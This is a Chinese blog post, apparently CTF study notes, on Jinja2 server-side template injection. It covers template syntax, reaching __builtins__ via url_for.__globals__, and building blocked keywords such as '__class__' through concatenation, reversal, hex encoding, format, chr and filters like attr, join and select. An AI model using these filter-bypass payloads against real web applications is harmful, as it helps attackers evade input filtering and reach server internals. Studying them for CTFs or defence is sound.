<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSTI | 向每个梦想加速</title><meta name="author" content="向每个梦想加速"><meta name="copyright" content="向每个梦想加速"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ssti服务器端模板注入介绍https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;3311?time__1311&#x3D;eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken&#x3D;71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig&#x3D;1a0c399d17412599679115146e00dd yu22x博客之ssti模板注入绕">
<meta property="og:type" content="article">
<meta property="og:title" content="SSTI">
<meta property="og:url" content="http://example.com/2025/03/06/SSTI/index.html">
<meta property="og:site_name" content="向每个梦想加速">
<meta property="og:description" content="ssti服务器端模板注入介绍https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;3311?time__1311&#x3D;eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken&#x3D;71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig&#x3D;1a0c399d17412599679115146e00dd yu22x博客之ssti模板注入绕">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/touxiang.png">
<meta property="article:published_time" content="2025-03-06T13:27:36.000Z">
<meta property="article:modified_time" content="2025-04-18T12:34:48.308Z">
<meta property="article:author" content="向每个梦想加速">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/touxiang.png"><link rel="shortcut icon" href="/img/urltouxiang.png"><link rel="canonical" href="http://example.com/2025/03/06/SSTI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SSTI',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/beijing.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">向每个梦想加速</span></a><a class="nav-page-title" href="/"><span class="site-name">SSTI</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-06T13:27:36.000Z" title="发表于 2025-03-06 21:27:36">2025-03-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-18T12:34:48.308Z" title="更新于 2025-04-18 20:34:48">2025-04-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>ssti服务器端模板注入介绍<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd">https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%25222cb62d33ba893b3db6b482f839a01105%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=2cb62d33ba893b3db6b482f839a01105&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-110220425-null-null.nonecase&amp;utm_term=ssti&amp;spm=1018.2226.3001.4450">yu22x博客之ssti模板注入绕过进阶</a></p>
<h1>语法</h1>
<p>官方文档对于模板的语法介绍如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements </span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output</span><br><span class="line"></span><br><span class="line">&#123;# ... #&#125; for Comments not included in the template output</span><br><span class="line"></span><br><span class="line">#  ... # for Line Statements</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。</span><br><span class="line">&#123;&#123;&#125;&#125;用于将表达式打印到模板输出</span><br><span class="line">&#123;##&#125;表示未包含在模板输出中的注释</span><br><span class="line">##可以有和&#123;%%&#125;相同的效果</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set x= &#x27;abcd&#x27; %&#125;  声明变量</span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125; 循环语句</span><br><span class="line">&#123;% if 25==5*5 %&#125;&#123;&#123;1&#125;&#125;&#123;% endif %&#125;  条件语句</span><br><span class="line"></span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] %&#125;	开始一个 for 循环，遍历列表 [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]，每次循环将当前元素赋值给变量 i</span><br><span class="line">&#123;&#123; i &#125;&#125;	输出变量 i 的值（当前的循环元素）</span><br><span class="line">&#123;% endfor %&#125;	结束循环</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># for i in [&#x27;a&#x27;,&#x27;1&#x27;]</span><br><span class="line">&#123;&#123; i &#125;&#125;</span><br><span class="line"># endfor</span><br><span class="line"></span><br><span class="line">&#123;% for i in [&#x27;a&#x27;,&#x27;1&#x27;] %&#125;</span><br><span class="line">&#123;&#123; i &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">这两条是等效的，但是有个前提，必须在environment中配置line_statement_prefix</span><br><span class="line">即</span><br><span class="line">app.jinja_env.line_statement_prefix=&quot;#&quot;</span><br></pre></td></tr></table></figure>
<h2 id="变量">变量</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can use a dot (.) to access attributes of a variable in addition to the standard Python __getitem__ “subscript” syntax ([]). </span><br></pre></td></tr></table></figure>
<p>也就是说<br>
除了标准的python语法使用点（.）外，还可以使用中括号（[]）来访问变量的属性。<br>
比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[&#x27;__classs__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>所以过滤了点，我们还可以用中括号绕过。</strong></p>
<p>如果想调用字典中的键值，其本质其实是调用了魔术方法<code>__getitem__</code><br>
<strong>所以对于取字典中键值的情况不仅可以用<code>[]</code>，也可以用<code>__getitem__</code></strong><br>
当然对于字典来说，我们也可以用他自带的一些方法了。pop就是其中的一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure>
<p><strong>我们要使用字典中的键值的话，也可以用<code>list.pop(&quot;var&quot;)</code></strong>,但大家最好不要用这个，除非万不得已，因为会删除里面的键，如果删除的是一些程序运行需要用到的，就可能使得服务器崩溃。然后过了一遍字典的方法，发现<strong>get</strong>和<strong>setdefault</strong>是个不错的选择</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[dict.get(key, default=None)</span><br><span class="line">返回指定键的值，如果值不在字典中返回default值</span><br><span class="line"></span><br><span class="line">dict.setdefault(key, default=None)</span><br><span class="line">和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default]()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.get(&#x27;__builtins__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(&#x27;__builtins__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>那么调用对象的方法具体是什么原理呢，其实他是调用了魔术方法<code>__getattribute__</code><br>
即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br><span class="line"><span class="string">&quot;&quot;</span>.<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&quot;__class__&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>如果题目过滤了class或者一些关键字，我们是不是就可以通过字符串处理进行拼接了。</strong><br>
对于我们来说，能转换成字符串会更好处理一些。<br>
那我们就顺势讲一下字符串的一些处理方法。</p>
<h1>字符串过滤</h1>
<h2 id="1、拼接"><strong>1、拼接</strong></h2>
<p><code>&quot;cla&quot;+&quot;ss&quot;</code></p>
<h2 id="2、反转"><strong>2、反转</strong></h2>
<p><code>&quot;__ssalc__&quot;[::-1]</code></p>
<p>但是实际上我发现其实加号是多余的，在jinjia2里面，<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，也就是说我们可以这样引用class，并且绕过字符串过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</span><br><span class="line">&quot;&quot;[&quot;__ssalc__&quot;][::-1]</span><br><span class="line">&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</span><br></pre></td></tr></table></figure>
<h2 id="3、ascii转换">3、ascii转换</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.format(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.format(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="4、编码绕过">4、编码绕过</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span><br><span class="line">对于python2的话，还可以利用base64进行绕过</span><br><span class="line">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="5、利用chr函数">5、利用chr函数</h2>
<p>因为我们没法直接使用chr函数，所以需要通过__builtins__找到他</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr %&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="6、在jinja2里面可以利用-进行拼接">6、在jinja2里面可以利用~进行拼接</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="7、大小写转换">7、大小写转换</h2>
<p>前提是过滤的只是小写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[&quot;__CLASS__&quot;.lower()]</span><br></pre></td></tr></table></figure>
<p>先想到这些，下面讲过滤器再补充</p>
<h1>过滤器</h1>
<p>原文介绍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may </span><br><span class="line">have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is </span><br><span class="line">applied to the next.</span><br><span class="line">For example, &#123;&#123; name|striptags|title &#125;&#125; will remove all HTML Tags from variable name and title-case the</span><br><span class="line">output (title(striptags(name))).</span><br><span class="line"></span><br><span class="line">变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数。可以链接多</span><br><span class="line">个过滤器。一个过滤器的输出应用于下一个过滤器。</span><br><span class="line"></span><br><span class="line">例如，&#123;&#123; name|striptags|title &#125;&#125; 将删除变量名中的所有HTML标记，并将title大小写为输出(title(striptags(name)))。</span><br></pre></td></tr></table></figure>
<p>讲几个对我们进行模板注入比较实用的吧，其他的大家可以去文档中学习。</p>
<h2 id="attr"><strong>attr</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get an attribute of an object. foo|attr(&quot;bar&quot;) works like foo.bar just that always an attribute is returned and </span><br><span class="line">items are not looked up.</span><br></pre></td></tr></table></figure>
<p>也就是说 attr用于获取变量<br>
例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure>
<p>常见于点号<code>(.)</code>被过滤，或者点号<code>(.)</code>和中括号<code>([])</code>都被过滤的情况。</p>
<h2 id="format"><strong>format</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apply the given values to a printf-style format string, like string % values.</span><br></pre></td></tr></table></figure>
<p>功能和我们前面讲到的字符串绕过中的format类似。<br>
用法<br>
{ “%s, %s!”|format(greeting, name) }}<br>
那么我们想要调用__class__就可以用format了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;.format(&#x27;_&#x27;, &#x27;_&#x27;, &#x27;class&#x27;, &#x27;_&#x27;, &#x27;_&#x27;)</span><br><span class="line">等同于&#x27;__class__&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;</span><br><span class="line">&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]</span><br></pre></td></tr></table></figure>
<h2 id="first-last-random"><strong>first last random</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Return the first item of a sequence.</span><br><span class="line">Return the last item of a sequence.</span><br><span class="line">Return a random item from the sequence.</span><br></pre></td></tr></table></figure>
<p>前两个其实用处不是很大，因为他只能返回第一个值或者最后一个，当然，如果我们用的就是第一个或者最后一个那就ok了。<br>
random的话是随机返回，这样我们跑个脚本肯定是可以得到我们想要的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__|last()</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure>
<h2 id="join"><strong>join</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Return a string which is the concatenation of the strings in the sequence. The separator between elements is an</span><br><span class="line">empty string per default, you can define it with the optional parameter:</span><br><span class="line"></span><br><span class="line">&#123;&#123; [1, 2, 3]|join(&#x27;|&#x27;) &#125;&#125;</span><br><span class="line">    -&gt; 1|2|3</span><br><span class="line"></span><br><span class="line">&#123;&#123; [1, 2, 3]|join &#125;&#125;</span><br><span class="line">    -&gt; 123</span><br><span class="line">It is also possible to join certain attributes of an object:</span><br><span class="line"></span><br><span class="line">&#123;&#123; users|join(&#x27;, &#x27;, attribute=&#x27;username&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这个用处就相当大了，我们貌似又多了一种字符串拼接的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[[&#x27;__clas&#x27;,&#x27;s__&#x27;]|join] 或者 &quot;&quot;[(&#x27;__clas&#x27;,&#x27;s__&#x27;)|join]</span><br><span class="line">相当于</span><br><span class="line">&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure>
<h2 id="lower"><strong>lower</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Convert a value to lowercase.</span><br><span class="line">功能类似于前面的转换成小写</span><br><span class="line"></span><br><span class="line">&quot;&quot;[&quot;__CLASS__&quot;|lower]</span><br></pre></td></tr></table></figure>
<h2 id="replace-reverse"><strong>replace reverse</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Return a copy of the value with all occurrences of a substring replaced with a new one. The first </span><br><span class="line">argument is the substring that should be replaced, the second is the replacement string. If the optional </span><br><span class="line">third argument count is given, only the first count occurrences are replaced</span><br><span class="line"></span><br><span class="line">Reverse the object or return an iterator that iterates over it the other way round.</span><br></pre></td></tr></table></figure>
<p>我们可以利用替换和反转还原回我们要用的字符串了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;) 构造出字符串 &quot;__class__&quot;</span><br><span class="line">&quot;__ssalc__&quot;|reverse 构造出 &quot;__class__&quot;</span><br></pre></td></tr></table></figure>
<h2 id="string"><strong>string</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Make a string unicode if it isn’t already. That way a markup string is not converted back to unicode.</span><br></pre></td></tr></table></figure>
<p>功能类似于python内置函数 str<br>
有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__   出来的是&lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">(().__class__|string)[0] 出来的是&lt;</span><br><span class="line">(().__class__ | string)[1:6] 出来的是class</span><br></pre></td></tr></table></figure>
<h2 id="select-unique">select unique</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Filters a sequence of objects by applying a test to each object, and only selecting the objects with the test succeeding.</span><br><span class="line">If no test is specified, each object will be evaluated as a boolean.</span><br><span class="line">通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。</span><br><span class="line">如果没有指定测试，则每个对象都将被计算为布尔值</span><br><span class="line"></span><br><span class="line">Returns a list of unique items from the given iterable.</span><br></pre></td></tr></table></figure>
<p>这两个乍一看感觉没啥用处，其实如果我们和上面的结合就会发现他们巨大的用处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">()|select|string</span><br><span class="line">结果如下</span><br><span class="line">&lt;generator object select_or_reject at 0x0000022717FF33C0&gt;</span><br></pre></td></tr></table></figure>
<p>这样我们会拥有比前面更多的字符来用于拼接</p>
